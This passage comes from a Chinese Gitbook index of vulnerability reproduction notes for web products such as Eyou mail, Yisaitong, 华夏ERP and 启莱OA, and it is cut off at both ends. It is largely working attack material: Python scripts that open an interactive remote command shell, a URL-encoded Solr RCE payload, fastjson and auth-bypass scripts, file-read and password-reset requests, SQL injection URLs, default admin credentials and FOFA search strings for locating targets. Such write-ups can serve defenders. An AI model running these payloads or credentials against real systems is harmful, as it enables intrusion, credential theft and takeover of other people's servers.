POC_2(target_url, check_code, PHPSESSID) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, check_code, PHPSESSID): vuln_url = target_url + \"?q=common/login\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"PHPSESSID={}; check_code={}\".format(PHPSESSID, check_code), \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\" } data = \"name=admin&password=zxsoft1234!%40%23%24&checkcode={}&doLoginSubmit=1\".format(check_code) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"1\" in response.text and response.status_code == 200: print(\"\\033[36m[o] 目标 {} 存在默认管理员弱口令 admin / zxsoft1234!@#$ \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在默认管理员弱口令 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC 中新金盾信息安全管理系统 默认超级管理员密码漏洞 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:51 "},"Web安全/亿赛通电子文档安全管理系统/亿赛通 电子文档安全管理系统远程命令执行漏洞/亿赛通 电子文档安全管理系统远程命令执行漏洞.html":{"url":"Web安全/亿赛通电子文档安全管理系统/亿赛通 电子文档安全管理系统远程命令执行漏洞/亿赛通 电子文档安全管理系统远程命令执行漏洞.html","title":"亿赛通 电子文档安全管理系统远程命令执行漏洞","keywords":"","body":"亿赛通 电子文档安全管理系统远程命令执行漏洞 漏洞描述 亿赛通 电子文档安全管理系统 dataimport 存在远程命令执行漏洞，攻击者通过构造特定的请求可执行任意命令 漏洞影响 亿赛通电子文档安全管理系统 FOFA title=\"电子文档安全管理系统\" 漏洞复现 登录界面如下： 首先我们需要访问以下URL来获取一个name的值： /solr/admin/cores 然后我们需要打开三剑客之一的BURP 使用POST请求，请求以下URL： /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22whoami%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20 其中开头的/sorl/*/dataimport之中的为刚刚的name值。 仔细查看后面的代码，我这里填写的whoami，在那里替换成其他命令即可。 然后再填写POST一个xml文件流，为： 我这里只为测试，执行whoami命令 可以看到返回了系统权限，NT也就是windows系统。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:53 "},"Web安全/亿邮/亿邮电子邮件系统 远程命令执行漏洞/亿邮电子邮件系统 远程命令执行漏洞.html":{"url":"Web安全/亿邮/亿邮电子邮件系统 远程命令执行漏洞/亿邮电子邮件系统 远程命令执行漏洞.html","title":"亿邮电子邮件系统 远程命令执行漏洞","keywords":"","body":"亿邮电子邮件系统 远程命令执行漏洞 漏洞描述 亿邮电子邮件系统 存在远程命令执行漏洞，攻击者可以执行任意命令 漏洞影响 [!NOTE] 亿邮电子邮件系统 FOFA [!NOTE] body=\"亿邮电子邮件系统\" 漏洞复现 登录页面如下 漏洞请求包如下 POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 39 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 type='|cat /etc/passwd||' 漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Eyou Email SYSTEM \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd >>> whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"type='|cat /etc/passwd||'\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}//webadm/?q=moni_detail.do&action=gragh \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, cmd): vuln_url = target_url + \"/webadm/?q=moni_detail.do&action=gragh\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"type='|{}||'\".format(cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() cmd = 'cat /etc/passwd' target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, cmd) Goby & POC [!NOTE] Eyou Mail system RCE Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:55 "},"Web安全/会捷通云视讯/会捷通云视讯list目录文件泄露漏洞/会捷通云视讯list目录文件泄露漏洞.html":{"url":"Web安全/会捷通云视讯/会捷通云视讯list目录文件泄露漏洞/会捷通云视讯list目录文件泄露漏洞.html","title":"会捷通云视讯list目录文件泄露漏洞","keywords":"","body":"会捷通云视讯 list 目录文件泄露漏洞 漏洞描述 会捷通云视讯某个文件 list参数 存在目录文件泄露漏洞，攻击者通过漏洞可以获取一些敏感信息 漏洞影响 会捷通云视讯 FOFA body=\"/him/api/rest/v1.0/node/role\" 漏洞复现 登陆页面如下 访问Url /him/api/rest/V1.0/system/log/list?filePath=../ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:56 "},"Web安全/会捷通云视讯/会捷通云视讯平台未授权任意文件读取漏洞/会捷通云视讯平台未授权任意文件读取漏洞.html":{"url":"Web安全/会捷通云视讯/会捷通云视讯平台未授权任意文件读取漏洞/会捷通云视讯平台未授权任意文件读取漏洞.html","title":"会捷通云视讯平台未授权任意文件读取漏洞","keywords":"","body":"会捷通云视讯平台存在未授权任意文件读取漏洞 漏洞描述 会捷通云视讯平台存在未授权任意文件读取漏洞，可通过POST函数进行任意文件读取 漏洞影响 会捷通云视讯平台 FOFA body=\"/him/api/rest/v1.0/node/role 漏洞复现 无需登录、可未授权读取服务器所有文件 通过访问漏洞url： /fileDownload?action=downloadBackupFile 再通过载体“fullPath=”即可进行任意文件读取 POST /fileDownload?action=downloadBackupFile HTTP/1.1 Host: x.x.x.x Content-Length: 20 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.57 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept: */* Origin: http://x.x.x.x Referer: http://x.x.x.x Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5 Connection: close fullPath=/etc/passwd Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:57 "},"Web安全/会捷通云视讯/会捷通云视讯平台登录绕过漏洞/会捷通云视讯平台登录绕过漏洞.html":{"url":"Web安全/会捷通云视讯/会捷通云视讯平台登录绕过漏洞/会捷通云视讯平台登录绕过漏洞.html","title":"会捷通云视讯平台登录绕过漏洞","keywords":"","body":"会捷通云视讯平台存在登录绕过漏洞 漏洞描述 会捷通云视讯平台存在登录绕过漏洞，可以通过修改返回包进行登录 漏洞影响 会捷通云视讯平台 FOFA body=\"/him/api/rest/v1.0/node/role 漏洞复现 替换登录返回包内容即可绕过登录验证。 HTTP/1.1 200 Date: Thu, 25 Mar 2021 13:53:45 GMT Accept-Ranges: bytes Server: Restlet-Framework/2.1.1 Vary: Accept-Charset, Accept-Encoding, Accept-Language, Accept Content-Type: application/json;charset=UTF-8 Connection: close Content-Length: 28 {\"token\":null,\"result\":null} 1. 拦截数据包 输入任意用户/密码，如admin/admin 2.点击登录，拦截返回包，替换为如下内容 正常返回包：提示密码错误： 替换： 放开拦截，可任意操作，删除，重启、升级、重置等等 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:57 "},"Web安全/佑友防火墙后台命令执行/佑友防火墙 后台命令执行漏洞/佑友防火墙 后台命令执行漏洞.html":{"url":"Web安全/佑友防火墙后台命令执行/佑友防火墙 后台命令执行漏洞/佑友防火墙 后台命令执行漏洞.html","title":"佑友防火墙 后台命令执行漏洞","keywords":"","body":"佑友防火墙 后台命令执行漏洞 漏洞描述 佑友防火墙 后台维护工具存在命令执行，由于没有过滤危险字符，导致可以执行任意命令 漏洞影响 佑友防火墙 FOFA title=\"佑友防火墙\" 漏洞复现 登录页面如下 默认账号密码为 User: admin Pass: hicomadmin 登录后台 系统管理 --> 维护工具 --> Ping Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:59 "},"Web安全/佳发巡查指挥系统管理中心/佳发巡查指挥系统管理中心越权漏洞/佳发巡查指挥系统管理中心越权漏洞.html":{"url":"Web安全/佳发巡查指挥系统管理中心/佳发巡查指挥系统管理中心越权漏洞/佳发巡查指挥系统管理中心越权漏洞.html","title":"佳发巡查指挥系统管理中心越权漏洞","keywords":"","body":"佳发巡查指挥系统管理中心越权漏洞 漏洞描述 佳发巡查指挥系统管理中心存在越权漏洞 漏洞影响 佳发巡查指挥系统管理中心 FOFA ”/js/spc/sec.js“ 漏洞复现 默认测试账号口令test/123456 登录后台，点击”保存信息“后抓包，修改如图相关参数即可越权修改管理员密码并进行登录。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:00 "},"Web安全/信呼oa/信呼oa 1.9.0-1.9.1 储存型xss/信呼oa 1.9.0-1.9.1 储存型xss.html":{"url":"Web安全/信呼oa/信呼oa 1.9.0-1.9.1 储存型xss/信呼oa 1.9.0-1.9.1 储存型xss.html","title":"信呼oa 1.9.0-1.9.1 储存型xss","keywords":"","body":"信呼oa 1.9.0-1.9.1 储存型xss 一、漏洞简介 二、漏洞影响 信呼oa 1.9.0-1.9.1 三、复现过程 首先搭建好之后跳转到一个登录页面 输入刚开始安装时设置的管理员usname paword然后点击登陆，然后抓包查看传参，然后去寻找登陆模块的源代码，根据传参的追踪，我们很快就能追踪到这个文件webmain\\model\\loginMode.php 然后我在这个登陆文件loginMode.php的第209行到215行发现了一些东西 这里出现了一个addlogs函数，看名字应该是添加日志，在logModel.php中发现了他的定义 这里是获取了信息然后给数组赋值，然后insert函数调用 在mysql.php 很明显这里是插入语句的模板，这里就应该是登陆失败后，日志会记录下来前面看的到那些数组赋值的信息。 通过查看Mysql日志发现，登录失败他会记录我们的Ip，那么就简单了，我们是否可以尝试使用X-Forwarded-For来改变他的ip，然后我们使用 X-Forwarded-For:127.0.0.1X-F-F成功更换后台Ip 打个xss 后台成功弹框 打开XSS平台 打一遍发现没用，获取不到cookie，F12看看咋回事 果然是xss代码出了问题构造xss代码，极限代码-->多加//防止被转入之前--> 参考链接 https://xz.aliyun.com/t/7887 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:01 "},"Web安全/华夏ERP/华夏ERP-SQL注入漏洞/华夏ERP-SQL注入漏洞.html":{"url":"Web安全/华夏ERP/华夏ERP-SQL注入漏洞/华夏ERP-SQL注入漏洞.html","title":"华夏ERP-SQL注入漏洞","keywords":"","body":"华夏ERP存在SQL注入漏洞 漏洞描述 华夏ERP基于SpringBoot框架和SaaS模式，可以算作是国内人气较高的一款ERP项目，但经过源码审计发现其存在多个漏洞，本篇为SQL注入漏洞解。 漏洞影响 华夏ERP FOFA 请自测 漏洞复现 漏洞复现： 1、漏洞代码位置 src/main/resources/mapper_xml/UserMapperEx.xml 使用mybatis时 ${} 会对参数和sql语句进行拼接，因而存在sql注入漏洞 2、漏洞验证 正常查询 GET /user/list?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22q%22%2C%22offset%22%3A%221%22%2C%22rows%22%3A%221%22%7D¤tPage=1&pageSize=10&t=1615274773529 HTTP/1.1Host: 47.116.69.14User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: closeReferer: http://47.116.69.14/pages/manage/user.htmlCookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274745; JSESSIONID=C5EBD91E0E68081AA25F206F2FECAC82; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274770 使用sleep延时注入 GET /user/list?search=%7B%22userName%22%3A%22'and+sleep(3)--%22%2C%22loginName%22%3A%22q%22%2C%22offset%22%3A%221%22%2C%22rows%22%3A%221%22%7D¤tPage=1&pageSize=10&t=1615274773529 HTTP/1.1Host: 47.116.69.14User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: closeReferer: http://47.116.69.14/pages/manage/user.htmlCookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274745; JSESSIONID=C5EBD91E0E68081AA25F206F2FECAC82; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274770 3、漏洞代码 src/main/java/com/jsh/erp/controller/ResourceController.java src/main/java/com/jsh/erp/service/CommonQueryManager.java src/main/java/com/jsh/erp/service/user/UserComponent.java src/main/java/com/jsh/erp/service/user/UserService.java src/main/resources/mapper_xml/UserMapperEx.xml Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:04 "},"Web安全/华夏ERP/华夏ERP命令执行漏洞/华夏ERP命令执行漏洞.html":{"url":"Web安全/华夏ERP/华夏ERP命令执行漏洞/华夏ERP命令执行漏洞.html","title":"华夏ERP命令执行漏洞","keywords":"","body":"华夏ERP命令执行漏洞 漏洞描述 华夏ERP基于SpringBoot框架和SaaS模式，可以算作是国内人气较高的一款ERP项目，但经过源码审计发现其存在多个漏洞，本篇为命令执行漏洞 漏洞影响 华夏ERP FOFA 请自测 漏洞复现 漏洞复现： 漏洞代码位置： com.jsh.erp.controller.DepotHeadController 漏洞代码分析： pom.xml文件中引用了fastjson，且版本为1.2.55 查看代码发现com.jsh.erp.controller.DepotController存在反序列化 但在靶场站点未找到该接口，推测靶场站代码未更新，发现流量中存在另一个使用search参数的接口，进行反序列化测试： 对了要URL编码一下。。。 接下来就是见证奇迹的时刻，dnslog收到dns请求！ 组合拳-未授权命令执行 利用方式： 很简单，就是两个漏洞合并一下，如下： 可以看到我是没有携带Cookie的，dnslog依然收到了请求 组合拳的POC： 使用方法： python3 华夏erp_fastjson.py x.x.x.x 80 qingy.dnslog.cn (替换你的dnslog地址) 源码： import socket,sys,re def SendGet(res,ip,port): request = re.sub('[\\r\\n]','\\r\\n',res) port = int(port) sock = socket.socket() # 建立socket sock.connect((ip, port)) # 远程连接 sock.send(request.encode('ascii')) # 向socket发送数据 response = b'' chunk = sock.recv(4096) # 从socket接收数据 print(chunk.decode()) def main(ip,port,dnslog): test = '{\"@type\":\"java.net.Inet4Address\",\"val\":\"'+ dnslog +'\"}' test = test.encode('utf-8') test = ''.join('%{:02X}'.format(x) for x in test) res = '''GET /a.css/../depotHead/list?search={data}¤tPage=1&pageSize=10 HTTP/1.1 Host: {host} Accept: application/json, text/javascript, */*; q=0.01 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.47 X-Requested-With: XMLHttpRequest Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5 Connection: close '''.format(data=test,host=ip+':'+port) #print(res) SendGet(res,ip,port) main(sys.argv[1],sys.argv[2],sys.argv[3]) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:06 "},"Web安全/华夏ERP/华夏ERP授权绕过漏洞/华夏ERP授权绕过漏洞.html":{"url":"Web安全/华夏ERP/华夏ERP授权绕过漏洞/华夏ERP授权绕过漏洞.html","title":"华夏ERP授权绕过漏洞","keywords":"","body":"华夏ERP授权绕过漏洞 漏洞描述 华夏ERP基于SpringBoot框架和SaaS模式，可以算作是国内人气较高的一款ERP项目，但经过源码审计发现其存在多个漏洞，本篇为授权绕过漏洞 漏洞影响 华夏ERP FOFA 请自测 漏洞复现 漏洞复现： 该项目利用filter做登录判断 com.jsh.erp.filter.LogCostFilter 其中值得关注的是ignoredList，如果url中存在ignoredList则不需要认证。 我们去寻找ignoredList，发现它在同一文件内，如下： 可以看到匹配的值为： .css#.js#.jpg#.png#.gif#.ico 那么绕过认证的payload我们就可以随便写了，如下： /a.css/../ 如未登录查看系统配置： 以上数据都为测试生成的数据，为虚假数据，如有雷同纯属巧合 GET /a.css/../systemConfig/list?search=%7B%22companyName%22%3A%22%22%7D¤tPage=1&pageSize=10 HTTP/1.1 Host: 47.116.69.14 Accept: application/json, text/javascript, */*; q=0.01 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.60 X-Requested-With: XMLHttpRequest Referer: http://47.116.69.14/pages/manage/systemConfig.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5 Connection: close 来个POC吧，验证起来方便 使用方式： python3 华夏erp未授权.py http://ip:port 源码： import sys,requests def main(ip): url = \"{ip}/a.css/../user/getUserList?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22%22%7D¤tPage=1&pageSize=15\".format(ip=ip) res = requests.get(url,verify=False,timeout=5) if res.status_code == 200: print(\"+ {ip} 访问成功\\n{data}\".format(ip=ip,data=res.text)) main(sys.argv[1]) ''' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:09 "},"Web安全/华夏ERP/华夏ERP第二处授权绕过漏洞/华夏ERP第二处授权绕过漏洞.html":{"url":"Web安全/华夏ERP/华夏ERP第二处授权绕过漏洞/华夏ERP第二处授权绕过漏洞.html","title":"华夏ERP第二处授权绕过漏洞","keywords":"","body":"华夏ERP第二处授权绕过漏洞 漏洞描述 华夏ERP基于SpringBoot框架和SaaS模式，可以算作是国内人气较高的一款ERP项目，但经过源码审计发现其存在多个漏洞，本篇为授权绕过第二个漏洞点。 漏洞影响 华夏ERP FOFA title=\"华夏ERP\" 漏洞复现 漏洞复现： 1、漏洞代码位置，利用filter做登录判断 com.jsh.erp.filter.LogCostFilter 如果URL开头匹配到了allowUrls中的内容则不跳转登录界面 追踪一下allowUrls的值： allowUrls将/user/login#/user/registerUser以#分割成数组： [“/user/login”,”/user/registerUser”] 下面我们需要将url开头设置为数组中的内容即可： 就比如/user/login/ 或者设置为/user/registerUser/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:10 "},"Web安全/华夏ERP/华夏ERP越权任意用户密码重置漏洞/华夏ERP越权任意用户密码重置漏洞.html":{"url":"Web安全/华夏ERP/华夏ERP越权任意用户密码重置漏洞/华夏ERP越权任意用户密码重置漏洞.html","title":"华夏ERP越权任意用户密码重置漏洞","keywords":"","body":"华夏ERP越权任意用户密码重置漏洞 漏洞描述 华夏ERP基于SpringBoot框架和SaaS模式，可以算作是国内人气较高的一款ERP项目，但经过源码审计发现其存在多个漏洞，本篇为越权任意用户密码重置漏洞 漏洞影响 华夏ERP FOFA title=\"华夏ERP\" 漏洞复现 一、越权任意密码重置漏洞 漏洞简单描述： 该项目利用id重置相应用户密码，且未做权限划分, 重置后为123456，漏洞代码位置为： src/main/java/com/jsh/erp/controller/UserController.java 测试漏洞的时候，我们先使用测试账号登录进后台，然后获取到所有用户list 发现主管大大的ID为63，那我们就可以把他的密码重置掉： 知道你们懒得敲，复制一下： POST /user/resetPwd HTTP/1.1 Host: 47.116.69.14 Accept: application/json, text/javascript, */*; q=0.01 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36 Edg/89.0.774.45 X-Requested-With: XMLHttpRequest Referer: http://47.116.69.14/pages/reports/account_report.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5 Cookie: JSESSIONID=D735ED1C9E200438866A79896DF1F77D; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 5 id=63 从上面的源码中可以看到，重置后的默认密码为123456 二、组合拳-前台任意用户密码重置漏洞 那么实战中怎么可能有测试账号给你登录后台呢，弱口令？爆破？只不过很少时候是yyds，那么我们就可以结合上一篇中的授权绕过漏洞打个组合拳。 我们从前台随便重置一个ID的密码： POST /a.css/../user/resetPwd HTTP/1.1 Host: 47.116.69.14 Content-Length: 8 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.60 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://47.116.69.14 Referer: http://47.116.69.14/pages/manage/user.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5 Connection: close id=90824 这时候肯定有人要问了，密码是给重置成123456了，那怎么知道账户是什么？？ (⊙o⊙)…阿这，枚举一下子？然后全试一遍？哈哈哈不管了，反正不是我实战，就是这么不负责~ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:11 "},"Web安全/原创先锋/原创先锋 后台管理平台 未授权访问漏洞/原创先锋 后台管理平台 未授权访问漏洞.html":{"url":"Web安全/原创先锋/原创先锋 后台管理平台 未授权访问漏洞/原创先锋 后台管理平台 未授权访问漏洞.html","title":"原创先锋 后台管理平台 未授权访问漏洞","keywords":"","body":"原创先锋 后台管理平台 未授权访问漏洞 漏洞描述 原创先锋 后台管理平台 存在未授权访问漏洞，攻击者通过漏洞可以任意接管账户权限 漏洞影响 原创先锋 后台管理平台 FOFA body=\"https://www.bjycxf.com\" 漏洞复现 后台登陆页面如下 [ 未授权的Url /admin/admin/admin_list.html [ 点击添加并授权即可获取后台模块权限 [ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:13 "},"Web安全/发货100虚拟商品自动发货系统/发货100虚拟商品自动发货系统存在SQL注入漏洞/发货100虚拟商品自动发货系统存在SQL注入漏洞.html":{"url":"Web安全/发货100虚拟商品自动发货系统/发货100虚拟商品自动发货系统存在SQL注入漏洞/发货100虚拟商品自动发货系统存在SQL注入漏洞.html","title":"发货100虚拟商品自动发货系统存在SQL注入漏洞","keywords":"","body":"发货100虚拟商品自动发货系统存在SQL注入漏洞 漏洞描述 发货100虚拟商品自动发货系统是一套特色鲜明，专业实用的优秀虚拟商品自动发货系统/文章付费阅读系统，无需人工值守，客户在线购买即可自动完成交易。支持缺货提醒/自动发货/回收站/免签支付等多种功能。该系统存在SQL注入漏洞，可获取敏感信息及账号密码。 漏洞影响 1.1.20201211 FOFA icon_hash=\"1420424513\" 漏洞复现 界面如下： 漏洞URL为： /?M_id=11&type=product M_id参数存在注入漏洞 直接sqlmap一把梭 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:15 "},"Web安全/启明天清汉马默认账户/启明天清汉马后台默认管理员/启明天清汉马后台默认管理员.html":{"url":"Web安全/启明天清汉马默认账户/启明天清汉马后台默认管理员/启明天清汉马后台默认管理员.html","title":"启明天清汉马后台默认管理员","keywords":"","body":"后台默认管理员账号： 账号：useradmin 密码：venus.user 进入后台可通过修改编辑用户任意修改管理权限。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:16 "},"Web安全/启莱OA/启莱OA CloseMsg.aspx SQL注入漏洞/启莱OA CloseMsg.aspx SQL注入漏洞.html":{"url":"Web安全/启莱OA/启莱OA CloseMsg.aspx SQL注入漏洞/启莱OA CloseMsg.aspx SQL注入漏洞.html","title":"启莱OA CloseMsg.aspx SQL注入漏洞","keywords":"","body":"启莱OA CloseMsg.aspx SQL注入漏洞 漏洞描述 启莱OA CloseMsg.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 漏洞影响 启莱OA FOFA app=\"启莱OA\" 漏洞复现 登录页面如下 存在SQL注入的文件为 CloseMsg.aspx http://xxx.xxx.xxx.xxx/client/CloseMsg.aspx?user=' and (select db_name())>0--&pwd=1 使用SQLmap对参数 user 进行注入 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:17 "},"Web安全/启莱OA/启莱OA messageurl.aspx SQL注入漏洞/启莱OA messageurl.aspx SQL注入漏洞.html":{"url":"Web安全/启莱OA/启莱OA messageurl.aspx SQL注入漏洞/启莱OA messageurl.aspx SQL注入漏洞.html","title":"启莱OA messageurl.aspx SQL注入漏洞","keywords":"","body":"启莱OA messageurl.aspx SQL注入漏洞 漏洞描述 启莱OA messageurl.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 漏洞影响 启莱OA FOFA app=\"启莱OA\" 漏洞复现 登录页面如下 存在SQL注入的文件为 messageurl.aspx http://xxx.xxx.xxx.xxx/client/messageurl.aspx?user=' and (select db_name())>0--&pwd=1 使用SQLmap对参数 user 进行注入 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:18 "},"Web安全/启莱OA/启莱OA treelist.aspx SQL注入漏洞/启莱OA treelist.aspx SQL注入漏洞.html":{"url":"Web安全/启莱OA/启莱OA treelist.aspx SQL注入漏洞/启莱OA treelist.aspx SQL注入漏洞.html","title":"启莱OA treelist.aspx SQL注入漏洞","keywords":"","body":"启莱OA treelist.aspx SQL注入漏洞 漏洞描述 启莱OA treelist.aspx文件存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息 漏洞影响 启莱OA FOFA app=\"启莱OA\" 漏洞复现 登录页面如下 存在SQL注入的文件为 treelist.aspx http://xxx.xxx.xxx.xxx/client/treelist.aspx?user=' and (select db_name())>0--&pwd=1 使用SQLmap对参数 user 进行注入 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:13:20 "},"Web安全/和信创天/和信创天云桌面系统 远程命令执行 RCE漏洞/和信创天云桌面系统 远程命令执行 